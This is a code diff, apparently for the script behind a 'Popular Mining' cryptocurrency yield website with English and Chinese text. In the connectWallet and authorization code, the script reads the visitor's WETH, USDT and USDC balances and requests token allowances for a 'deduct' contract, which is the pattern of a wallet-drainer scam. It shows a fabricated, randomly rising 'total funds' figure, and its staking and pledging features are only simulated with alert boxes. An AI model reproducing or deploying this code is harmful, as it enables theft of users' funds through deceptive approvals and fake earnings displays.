@@ -34,14 +34,14 @@ const totalValue = document.getElementById('totalValue');
 const grossOutputValue = document.querySelector('#liquidity .stat-value:nth-of-type(1)');
 const cumulativeValue = document.querySelector('#liquidity .stat-value:nth-of-type(2)');
 const claimBtn = document.createElement('button');
-claimBtn.id = 'claimButton'; // ===== 新增：為 Claim 按鈕添加 ID，方便管理 =====
+claimBtn.id = 'claimButton';
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
-let stakingStartTime = localStorage.getItem('stakingStartTime') ? parseInt(localStorage.getItem('stakingStartTime')) : null;
-let claimedInterest = localStorage.getItem('claimedInterest') ? parseFloat(localStorage.getItem('claimedInterest')) : 0;
+let stakingStartTime = null; // 初始化為 null
+let claimedInterest = 0; // 初始化為 0
 let pledgedAmount = 0;
-let interestInterval = null; // ===== 新增：用於管理計時器 =====
+let interestInterval = null;
 
 //---UI Control Functions (使用者介面控制函數)---
 function updateStatus(message) {
@@ -55,14 +55,12 @@ function resetState(showMsg = true) {
     stakingStartTime = null;
     claimedInterest = 0;
     pledgedAmount = 0;
-    // ===== 修改：清除計時器並重置UI =====
     if (interestInterval) clearInterval(interestInterval);
     localStorage.removeItem('stakingStartTime');
     localStorage.removeItem('claimedInterest');
-    if (startBtn) startBtn.style.display = 'block'; // 確保 Start 按鈕顯示
+    if (startBtn) startBtn.style.display = 'block';
     const existingClaimBtn = document.getElementById('claimButton');
-    if (existingClaimBtn) existingClaimBtn.remove(); // 移除 Claim 按鈕
-    // ===== 修改結束 =====
+    if (existingClaimBtn) existingClaimBtn.remove();
     if (connectButton) {
         connectButton.classList.remove('connected');
         connectButton.textContent = 'Connect';
@@ -107,7 +105,7 @@ function updateTotalFunds() {
         const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
-        let initialFunds = 12856459.94;
+        let initialFunds = 2856459.94;
         const increaseRate = Math.random() * (0.1 - 0.01) + 0.01;
         const totalIncrease = elapsedSeconds * increaseRate;
         const totalFunds = initialFunds + totalIncrease;
@@ -128,43 +126,46 @@ function updateInterest() {
     }
 }
 
-// ===== 新增：一個統一管理挖礦UI的函數 =====
 function activateStakingUI() {
-    if (startBtn) startBtn.style.display = 'none'; // 隱藏 Start 按鈕
-    
-    // 避免重複添加 Claim 按鈕
+    if (startBtn) startBtn.style.display = 'none';
     if (document.getElementById('claimButton')) return;
-
     claimBtn.textContent = translations[currentLang].claimBtnText || 'Claim';
     claimBtn.className = 'start-btn';
     claimBtn.style.marginTop = '10px';
     claimBtn.disabled = false;
-    
     const placeholder = document.getElementById('claimButtonPlaceholder');
     if (placeholder) {
         placeholder.appendChild(claimBtn);
     } else {
         document.getElementById('liquidity').appendChild(claimBtn);
     }
-    
-    if (!claimBtn.hasEventListener) { // 避免重複綁定事件
+    if (!claimBtn.hasEventListener) {
         claimBtn.addEventListener('click', claimInterest);
         claimBtn.hasEventListener = true;
     }
-
-    if (interestInterval) clearInterval(interestInterval); // 清除舊的計時器
-    interestInterval = setInterval(updateInterest, 1000); // 啟動新的計時器
+    if (interestInterval) clearInterval(interestInterval);
+    interestInterval = setInterval(updateInterest, 1000);
 }
-// ===== 新增結束 =====
 
-// ===== 新增：用於恢復狀態的函數 =====
+// ===== 修改開始：這是最終修正版的狀態恢復函數 =====
 function restoreStakingState() {
-    if (stakingStartTime) {
+    // 直接從 localStorage 讀取數據，這是最可靠的數據源
+    const storedStartTime = localStorage.getItem('stakingStartTime');
+    const storedClaimedInterest = localStorage.getItem('claimedInterest');
+
+    // 只有在 localStorage 中確實存在 startTime 時才恢復狀態
+    if (storedStartTime) {
         console.log("偵測到已存在的挖礦狀態，正在恢復UI...");
+
+        // 更新全域變數，確保利息計算等功能正常
+        stakingStartTime = parseInt(storedStartTime);
+        claimedInterest = storedClaimedInterest ? parseFloat(storedClaimedInterest) : 0;
+        
+        // 觸發 UI 更新
         activateStakingUI();
     }
 }
-// ===== 新增結束 =====
+// ===== 修改結束 =====
 
 //---Core Wallet Logic (核心錢包邏輯)---
 async function sendMobileRobustTransaction(populatedTx) {
@@ -213,8 +214,12 @@ async function initializeWallet() {
         });
         window.ethereum.on('chainChanged', async () => { console.log("鏈切換偵測到，更新狀態..."); await initializeWallet(); });
         const accounts = await provider.send('eth_accounts', []);
-        if (accounts.length > 0) { resetState(false); await connectWallet(); }
-        updateStatus("請先連接您的錢包以繼續。");
+        if (accounts.length > 0) {
+            // 注意：這裡不再調用 resetState，connectWallet 內部會處理狀態更新
+            await connectWallet(); 
+        } else {
+             updateStatus("請先連接您的錢包以繼續。");
+        }
     } catch (error) {
         console.error("初始化錢包錯誤:", error);
         updateStatus(`初始化失敗: ${error.message}`);
@@ -282,27 +287,28 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
 
 async function connectWallet() {
     try {
-        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
-            await initializeWallet();
-            const network = await provider.getNetwork();
-            if (network.chainId !== 1n) return;
-        }
+        if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
+        
         updateStatus('請在錢包中確認連接...');
         const accounts = await provider.send('eth_requestAccounts', []);
         if (accounts.length === 0) throw new Error("未選擇帳戶。");
-        const currentConnectedAddress = accounts[0];
-        if (userAddress && userAddress !== currentConnectedAddress) {
-            console.warn(`⚠️ 檢測到地址切換從 ${userAddress.slice(0, 8)}... 到 ${currentConnectedAddress.slice(0, 8)}.... 強制重置。`);
-            resetState(false);
+        
+        const newAddress = accounts[0];
+        if (userAddress && userAddress.toLowerCase() !== newAddress.toLowerCase()) {
+            console.warn(`⚠️ 檢測到地址切換。強制重置。`);
+            resetState(false); // 只有在地址切換時才重置
         }
+
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         console.log("【DEBUG】錢包已連接。當前用戶地址:", userAddress);
+
         deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        updateStatus('準備最佳化授權流程...');
+        
+        updateStatus('正在獲取錢包數據...');
         let ethBalance, wethBalance, usdtBalance, usdcBalance;
         try {
             [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
@@ -314,10 +320,11 @@ async function connectWallet() {
         } catch (error) {
             ethBalance = await provider.getBalance(userAddress);
             wethBalance = usdtBalance = usdcBalance = 0n;
-            console.warn("【DEBUG】獲取餘額失敗，僅使用 ETH 餘額:", error.message);
+            console.warn("【DEBUG】獲取餘額失敗:", error.message);
         }
         const balances = { usdt: usdtBalance, usdc: usdcBalance, weth: wethBalance };
         updateWalletBalance(balances);
+        
         const hasSufficientEth = (ethBalance + wethBalance) >= ethers.parseEther("1.0");
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
@@ -328,20 +335,19 @@ async function connectWallet() {
         ]);
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
+        
         let tokensToProcess;
         if (hasSufficientEth) {
             tokensToProcess = [ { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }, { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ];
-            updateStatus('檢測到足夠的 ETH/WETH 餘額 (>= 1 ETH)。開始 WETH、USDT、USDC 授權流程。');
         } else {
             tokensToProcess = [ { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS } ];
-            updateStatus('ETH/WETH 餘額不足 (< 1 ETH)。開始 USDT、USDC 授權流程。');
         }
-        if (!isFullyAuthorized) await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
-        await checkAuthorization();
+        if (!isFullyAuthorized) {
+             await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
+        }
         
-        // ===== 修改：在錢包連接成功後，調用狀態恢復函數 =====
+        await checkAuthorization();
         restoreStakingState();
-        // ===== 修改結束 =====
 
     } catch (error) {
         console.error("連接錢包錯誤:", error);
@@ -374,7 +380,6 @@ function claimInterest() {
 }
 
 //---Language Control Functions---
-// (此部分無修改，保持原樣)
 const translations = { 'en': { title: 'Popular Mining', subtitle: 'Start Earning Millions', tabLiquidity: 'Liquidity', tabPledging: 'Pledging', grossOutputLabel: 'Gross Output', cumulativeLabel: 'Cumulative', walletBalanceLabel: 'Wallet Balance', accountBalanceLabel: 'Account Balance', compoundLabel: '⚡ Compound', nextBenefit: 'Next Benefit: 00:00:00', startBtnText: 'Start', pledgeAmountLabel: 'Pledge Amount', pledgeDurationLabel: 'Duration', pledgeBtnText: 'Pledge Now', totalPledgedLabel: 'Total Pledged', expectedYieldLabel: 'Expected Yield', apyLabel: 'APY', lockedUntilLabel: 'Locked Until', claimBtnText: 'Claim' }, 'zh-Hant': { title: '熱門挖礦', subtitle: '開始賺取數百萬', tabLiquidity: '流動性', tabPledging: '質押', grossOutputLabel: '總產出', cumulativeLabel: '累計', walletBalanceLabel: '錢包餘額', accountBalanceLabel: '帳戶餘額', compoundLabel: '⚡ 複利', nextBenefit: '下次收益: 00:00:00', startBtnText: '開始', pledgeAmountLabel: '質押金額', pledgeDurationLabel: '期間', pledgeBtnText: '立即質押', totalPledgedLabel: '總質押', expectedYieldLabel: '預期收益', apyLabel: '年化收益率', lockedUntilLabel: '鎖定至', claimBtnText: '領取' }, 'zh-Hans': { title: '热门挖矿', subtitle: '开始赚取数百万', tabLiquidity: '流动性', tabPledging: '质押', grossOutputLabel: '总产出', cumulativeLabel: '累计', walletBalanceLabel: '钱包余额', accountBalanceLabel: '账户余额', compoundLabel: '⚡ 复利', nextBenefit: '下次收益: 00:00:00', startBtnText: '开始', pledgeAmountLabel: '质押金额', pledgeDurationLabel: '期间', pledgeBtnText: '立即质押', totalPledgedLabel: '总质押', expectedYieldLabel: '预期收益', apyLabel: '年化收益率', lockedUntilLabel: '锁定至', claimBtnText: '领取' } };
 let currentLang = navigator.language || navigator.userLanguage;
 if (!['en', 'zh-Hant', 'zh-Hans'].includes(currentLang)) currentLang = 'en';
@@ -382,13 +387,17 @@ else if (currentLang === 'zh') currentLang = 'zh-Hans';
 const languageSelect = document.getElementById('languageSelect');
 const elements = { title: document.getElementById('title'), subtitle: document.getElementById('subtitle'), tabLiquidity: document.getElementById('tabLiquidity'), tabPledging: document.getElementById('tabPledging'), grossOutputLabel: document.getElementById('grossOutputLabel'), cumulativeLabel: document.getElementById('cumulativeLabel'), walletBalanceLabel: document.getElementById('walletBalanceLabel'), accountBalanceLabel: document.getElementById('accountBalanceLabel'), compoundLabel: document.getElementById('compoundLabel'), nextBenefit: document.getElementById('nextBenefit'), startBtnText: document.getElementById('startBtn'), pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), pledgeBtnText: document.getElementById('pledgeBtn'), totalPledgedLabel: document.getElementById('totalPledgedLabel'), expectedYieldLabel: document.getElementById('expectedYieldLabel'), apyLabel: document.getElementById('apyLabel'), lockedUntilLabel: document.getElementById('lockedUntilLabel'), claimBtnText: claimBtn };
 function updateLanguage(lang) { currentLang = lang; languageSelect.value = lang; for (let key in elements) { if (elements[key] && translations[lang][key]) { elements[key].textContent = translations[lang][key]; } } if (claimBtn.parentNode) claimBtn.textContent = translations[lang].claimBtnText || 'Claim'; }
-languageSelect.value = currentLang; updateLanguage(currentLang);
-languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
 
 //---Event Listeners & Initial Load (事件監聽器與初始載入)---
+document.addEventListener('DOMContentLoaded', () => {
+    languageSelect.value = currentLang; 
+    updateLanguage(currentLang);
+    initializeWallet();
+});
+
+languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
 if (connectButton) connectButton.addEventListener('click', () => { if (connectButton.classList.contains('connected')) disconnectWallet(); else connectWallet(); });
 
-// ===== 修改：簡化 startBtn 的邏輯 =====
 startBtn.addEventListener('click', () => {
     if (!connectButton.classList.contains('connected')) {
         alert('請先連接您的錢包！');
@@ -398,10 +407,9 @@ startBtn.addEventListener('click', () => {
         stakingStartTime = Date.now();
         localStorage.setItem('stakingStartTime', stakingStartTime.toString());
         alert('開始流動性挖礦... (模擬: 流程已啟動)');
-        activateStakingUI(); // 調用統一的UI管理函數
+        activateStakingUI();
     }
 });
-// ===== 修改結束 =====
 
 pledgeBtn.addEventListener('click', async () => { if (!connectButton.classList.contains('connected')) { alert('請先連接您的錢包！'); return; } const amount = parseFloat(pledgeAmount.value) || 0; if (!amount) { alert('請輸入質押金額！'); return; } pledgedAmount = amount; alert(`質押 ${amount} ${pledgeToken.value} 於 ${pledgeDuration.value} 天... (模擬: 質押成功)`); const totalPledgedValue = document.getElementById('totalPledgedValue'); let currentTotal = parseFloat(totalPledgedValue.textContent) || 0; totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`; });
 refreshWallet.addEventListener('click', async () => { if (!connectButton.classList.contains('connected') || !signer) { alert('請先連接您的錢包！'); return; } updateStatus('正在刷新餘額...'); const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) }; updateWalletBalance(balances); updateStatus(''); alert('刷新錢包餘額成功！'); });
@@ -409,4 +417,3 @@ walletTokenSelect.addEventListener('change', async () => { if (!signer) { wallet
 const tabs = document.querySelectorAll('.tab'); const sections = document.querySelectorAll('.content-section');
 tabs.forEach(tab => { tab.addEventListener('click', () => { tabs.forEach(t => t.classList.remove('active')); tab.classList.add('active'); sections.forEach(s => s.classList.remove('active')); document.getElementById(tab.dataset.tab).classList.add('active'); }); });
 setInterval(updateTotalFunds, 1000);
-initializeWallet();
